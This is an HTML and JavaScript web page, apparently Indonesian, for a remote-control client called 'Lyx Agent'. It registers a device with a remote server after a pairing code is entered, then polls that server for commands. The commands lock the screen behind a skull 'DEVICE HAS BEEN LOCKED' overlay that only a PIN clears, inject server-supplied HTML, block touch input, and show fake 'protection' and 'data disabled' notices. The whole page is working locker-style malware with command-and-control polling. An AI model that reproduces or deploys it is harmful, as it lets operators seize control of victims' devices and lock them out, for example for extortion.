<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Lyx Agent</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', sans-serif; -webkit-tap-highlight-color:transparent; }
  body {
    background: radial-gradient(circle at top, #1a0000 0%, #000 70%);
    min-height: 100vh;
    color: #fff;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }
  .container {
    width: 100%;
    max-width: 380px;
    background: rgba(15,0,0,0.9);
    border: 1px solid #cc0000;
    border-radius: 18px;
    padding: 30px 22px;
    box-shadow: 0 0 40px #cc000055;
  }
  .logo { text-align: center; margin-bottom: 25px; }
  .logo-icon {
    font-size: 50px;
    color: #ff2222;
    display: inline-block;
    filter: drop-shadow(0 0 15px #ff0000);
  }
  .logo h1 {
    font-size: 20px;
    margin-top: 8px;
    color: #ff2222;
    letter-spacing: 3px;
    text-shadow: 0 0 12px #ff0000;
    font-weight: 900;
  }
  .logo p { font-size: 10px; color: #888; margin-top: 4px; letter-spacing: 1px; }

  .input-group { margin-bottom: 18px; }
  .input-group label {
    display: block;
    font-size: 11px;
    color: #ff6666;
    margin-bottom: 8px;
    letter-spacing: 1px;
  }
  .input-group input {
    width: 100%;
    background: #000;
    border: 1px solid #660000;
    border-radius: 10px;
    padding: 14px;
    color: #00ffcc;
    font-size: 20px;
    letter-spacing: 6px;
    text-align: center;
    font-family: 'Courier New', monospace;
    font-weight: bold;
    text-transform: uppercase;
  }
  .input-group input:focus {
    outline: none;
    border-color: #cc0000;
    box-shadow: 0 0 20px #cc000088;
  }

  .btn {
    width: 100%;
    padding: 14px;
    border: none;
    border-radius: 10px;
    background: linear-gradient(135deg, #cc0000, #660000);
    color: #fff;
    font-size: 14px;
    font-weight: bold;
    letter-spacing: 2px;
    cursor: pointer;
    box-shadow: 0 0 20px #cc000066;
    text-transform: uppercase;
  }
  .btn:disabled { opacity: 0.5; }

  .status {
    margin-top: 15px;
    padding: 12px;
    border-radius: 8px;
    font-size: 12px;
    text-align: center;
    display: none;
  }
  .status.show { display: block; }
  .status.success { background: rgba(0,200,100,0.15); border:1px solid #00cc66; color:#00ff88; }
  .status.error { background: rgba(200,0,50,0.15); border:1px solid #cc0033; color:#ff4477; }

  .success-page { display: none; text-align: center; }
  .success-page.active { display: block; }
  .check-icon { font-size: 60px; color: #00ff88; filter: drop-shadow(0 0 20px #00ff88); }
  .success-page h2 { margin-top: 15px; color: #00ff88; font-size: 18px; letter-spacing: 2px; }
  .success-page p { color: #aaa; font-size: 11px; margin-top: 8px; }

  .device-info {
    background: #0a0000;
    border: 1px solid #cc000055;
    border-radius: 10px;
    padding: 12px;
    margin-top: 15px;
    text-align: left;
    font-size: 11px;
  }
  .device-info div { margin: 5px 0; color: #ccc; }
  .device-info span { color: #00ffcc; font-weight: bold; }

  /* LOCK SCREEN OVERLAY */
  #lyx-lock {
    position: fixed !important;
    top: 0; left: 0;
    width: 100vw; height: 100vh;
    background: #000;
    z-index: 999999;
    overflow: auto;
  }

  #lyx-lock-overlay {
    position: fixed;
    top: 0; left: 0;
    width: 100vw; height: 100vh;
    background: #000;
    z-index: 999999;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    padding: 30px;
    text-align: center;
    font-family: 'Courier New', monospace;
  }

  .pin-input {
    background: #0a0000;
    border: 2px solid #cc0000;
    border-radius: 10px;
    padding: 15px;
    color: #ff2222;
    font-size: 24px;
    letter-spacing: 8px;
    text-align: center;
    width: 220px;
    font-family: 'Courier New', monospace;
    margin: 20px 0;
  }
  .pin-input:focus { outline: none; box-shadow: 0 0 25px #ff0000aa; }

  #lyx-touch-block {
    position: fixed;
    top: 0; left: 0;
    width: 100vw; height: 100vh;
    z-index: 999998;
    background: transparent;
  }

  #lyx-text-overlay {
    position: fixed;
    top: 50%; left: 50%;
    transform: translate(-50%, -50%);
    background: rgba(20, 0, 0, 0.95);
    border: 2px solid #cc0000;
    border-radius: 12px;
    padding: 25px 30px;
    color: #ff4444;
    font-size: 16px;
    text-align: center;
    max-width: 85vw;
    z-index: 999997;
    box-shadow: 0 0 40px #cc000088;
    font-family: 'Courier New', monospace;
    animation: textPop 0.4s ease;
  }
  @keyframes textPop {
    0% { transform: translate(-50%, -50%) scale(0.7); opacity: 0; }
    100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
  }
</style>
</head>
<body>

<div class="container" id="mainContainer">

  <!-- INPUT CODE -->
  <div id="inputPage">
    <div class="logo">
      <div class="logo-icon">☠</div>
      <h1>LYX AGENT</h1>
      <p>ZAMZZZ SYSTEM · AUTO CONNECT</p>
    </div>

    <div class="input-group">
      <label>🔑 MASUKKAN CODE PAIRING</label>
      <input type="text" id="codeInput" maxlength="8" placeholder="XXXXXXXX" autocomplete="off">
    </div>

    <button class="btn" id="connectBtn" onclick="connectDevice()">CONNECT</button>

    <div class="status" id="status"></div>
  </div>

  <!-- SUKSES -->
  <div class="success-page" id="successPage">
    <div class="check-icon">✓</div>
    <h2>TERHUBUNG!</h2>
    <p>Perangkat berhasil terdaftar.</p>

    <div class="device-info">
      <div>📱 Nama: <span id="devName">-</span></div>
      <div>🔧 Model: <span id="devModel">-</span></div>
      <div>💻 OS: <span id="devOs">-</span></div>
      <div>🆔 ID: <span id="devId">-</span></div>
      <div>🟢 Status: <span>ONLINE</span></div>
    </div>
  </div>

</div>

<script>
/* ==================== CONFIG ==================== */
const API_BASE = "https://lyx-server-production-bc16.up.railway.app";

let deviceId = localStorage.getItem('lyx_device_id') || null;
let isPolling = false;
let currentPin = null;

const codeInput = document.getElementById('codeInput');
codeInput.addEventListener('input', e => {
  e.target.value = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
});
codeInput.addEventListener('keypress', e => {
  if (e.key === 'Enter') connectDevice();
});

function showStatus(msg, type = 'success') {
  const s = document.getElementById('status');
  s.textContent = msg;
  s.className = 'status show ' + type;
}

/* ==================== CONNECT ==================== */
async function connectDevice() {
  const code = codeInput.value.trim().toUpperCase();
  if (code.length !== 8) { showStatus('Code harus 8 karakter!', 'error'); return; }

  const btn = document.getElementById('connectBtn');
  btn.disabled = true;
  btn.textContent = 'CONNECTING...';
  showStatus('Menghubungkan...');

  const info = detectDevice();

  try {
    const res = await fetch(API_BASE + '/api/register-device', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ code, ...info })
    });
    const data = await res.json();

    if (!data.success) {
      btn.disabled = false;
      btn.textContent = 'CONNECT';
      showStatus('❌ ' + (data.message || 'Code invalid'), 'error');
      return;
    }

    deviceId = data.deviceId;
    localStorage.setItem('lyx_device_id', deviceId);

    setTimeout(() => {
      document.getElementById('devName').textContent = info.name;
      document.getElementById('devModel').textContent = info.model;
      document.getElementById('devOs').textContent = info.os;
      document.getElementById('devId').textContent = deviceId.slice(-8);
      document.getElementById('inputPage').style.display = 'none';
      document.getElementById('successPage').classList.add('active');
    }, 500);

    startPolling();

  } catch (e) {
    btn.disabled = false;
    btn.textContent = 'CONNECT';
    showStatus('❌ Server tidak terjangkau', 'error');
  }
}

/* ==================== DETECT DEVICE ==================== */
function detectDevice() {
  const ua = navigator.userAgent;
  let type = 'android', os = 'Unknown', model = 'Unknown', name = 'Perangkat';

  if (/android/i.test(ua)) {
    const m = ua.match(/Android\s([\d.]+)/);
    os = 'Android ' + (m ? m[1] : '');
    const mm = ua.match(/;\s([^;)]+)\sBuild/);
    model = mm ? mm[1].trim() : 'Android Device';
    name = model;
  } else if (/iphone|ipad/i.test(ua)) {
    type = 'ios'; os = 'iOS'; model = 'Apple'; name = 'iPhone/iPad';
  }
  return { name, model, os, type };
}

/* ==================== POLLING ==================== */
function startPolling() {
  if (isPolling) return;
  isPolling = true;
  poll();
}

async function poll() {
  if (!deviceId) return;
  try {
    const res = await fetch(API_BASE + '/api/agent/commands/' + deviceId);
    const data = await res.json();
    if (data.commands && data.commands.length) {
      data.commands.forEach(executeCommand);
    }
  } catch (e) {}
  setTimeout(poll, 3000);
}

/* ==================== EXECUTE COMMAND ==================== */
function executeCommand(cmd) {
  console.log('Command:', cmd);
  switch (cmd.type) {
    case 'lock': applyLock(null, cmd.pin, cmd.message); break;
    case 'lockhtml': applyLock(cmd.html, cmd.pin); break;
    case 'unlock': removeLock(); break;
    case 'text': showTextOverlay(cmd.message); break;
    case 'blocktouch': blockTouch(); break;
    case 'unlocktouch': unblockTouch(); break;
    case 'reconnect': doReconnect(); break;
    case 'killdata': killData(); break;
    case 'antiuninstall': antiUninstall(); break;
  }
}

/* ==================== LOCK HTML ==================== */
function applyLock(html, pin, message) {
  removeLock();
  currentPin = pin;

  const el = document.createElement('div');
  el.id = 'lyx-lock';

  if (html) {
    el.innerHTML = html;
  } else {
    el.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;flex-direction:column;min-height:100vh;background:radial-gradient(circle,#1a0000,#000);font-family:'Courier New',monospace;padding:20px;">
        <div style="font-size:100px;color:#cc0000;text-shadow:0 0 30px #ff0000,0 0 60px #990000;animation:pulse 2s infinite;">☠</div>
        <div style="color:#ff2222;font-size:28px;letter-spacing:8px;margin-top:20px;text-shadow:0 0 15px #ff0000;">LOCKED</div>
        <div style="color:#aa0000;font-size:13px;letter-spacing:4px;margin-top:10px;">DEVICE HAS BEEN LOCKED</div>
        <div style="color:#ff3333;font-size:12px;margin-top:30px;text-align:center;line-height:1.8;">${message || 'Hubungi admin untuk membuka'}</div>
        <input type="number" class="pin-input" id="unlockPin" placeholder="****" maxlength="6">
        <button class="btn" style="width:200px;" onclick="tryUnlock()">UNLOCK</button>
        <div id="pinError" style="color:#ff0000;font-size:11px;margin-top:10px;display:none;">PIN SALAH!</div>
      </div>
      <style>
        @keyframes pulse {
          0%,100% { transform:scale(1); text-shadow:0 0 30px #ff0000,0 0 60px #990000; }
          50% { transform:scale(1.1); text-shadow:0 0 50px #ff0000,0 0 100px #990000; }
        }
      </style>
    `;
  }

  document.body.appendChild(el);
  document.body.style.overflow = 'hidden';
}

function tryUnlock() {
  const inp = document.getElementById('unlockPin');
  if (!inp) return;
  if (inp.value === String(currentPin)) {
    removeLock();
  } else {
    const err = document.getElementById('pinError');
    if (err) err.style.display = 'block';
    inp.value = '';
  }
}

function removeLock() {
  const el = document.getElementById('lyx-lock');
  if (el) el.remove();
  document.body.style.overflow = '';
  currentPin = null;
}

/* ==================== TEXT OVERLAY ==================== */
function showTextOverlay(msg) {
  const old = document.getElementById('lyx-text-overlay');
  if (old) old.remove();

  const el = document.createElement('div');
  el.id = 'lyx-text-overlay';
  el.textContent = msg;
  document.body.appendChild(el);

  setTimeout(() => el.remove(), 5000);
}

/* ==================== BLOCK TOUCH ==================== */
function blockTouch() {
  if (document.getElementById('lyx-touch-block')) return;
  const el = document.createElement('div');
  el.id = 'lyx-touch-block';
  el.addEventListener('touchstart', e => e.preventDefault(), { passive: false });
  el.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
  el.addEventListener('click', e => e.preventDefault());
  document.body.appendChild(el);
}

function unblockTouch() {
  const el = document.getElementById('lyx-touch-block');
  if (el) el.remove();
}

/* ==================== RECONNECT ==================== */
function doReconnect() {
  location.reload();
}

/* ==================== KILL DATA (limited) ==================== */
function killData() {
  // WebView tidak bisa matikan data HP, tapi bisa tampilkan pesan
  showTextOverlay('DATA CONNECTION DISABLED');
}

/* ==================== ANTI UNINSTALL (limited) ==================== */
function antiUninstall() {
  // WebView tidak bisa cegah uninstall, cuma bisa tampilkan status
  showTextOverlay('PROTECTION ACTIVE');
}

/* ==================== AUTO RECONNECT ==================== */
window.addEventListener('load', () => {
  if (deviceId) {
    fetch(API_BASE + '/api/devices')
      .then(r => r.json())
      .then(list => {
        const exists = list.find(d => d.id === deviceId);
        if (exists) {
          document.getElementById('devName').textContent = exists.name;
          document.getElementById('devModel').textContent = exists.model;
          document.getElementById('devOs').textContent = exists.os;
          document.getElementById('devId').textContent = deviceId.slice(-8);
          document.getElementById('inputPage').style.display = 'none';
          document.getElementById('successPage').classList.add('active');
          startPolling();
        } else {
          localStorage.removeItem('lyx_device_id');
          deviceId = null;
        }
      }).catch(() => {});
  }
});
</script>
</body>
</html>
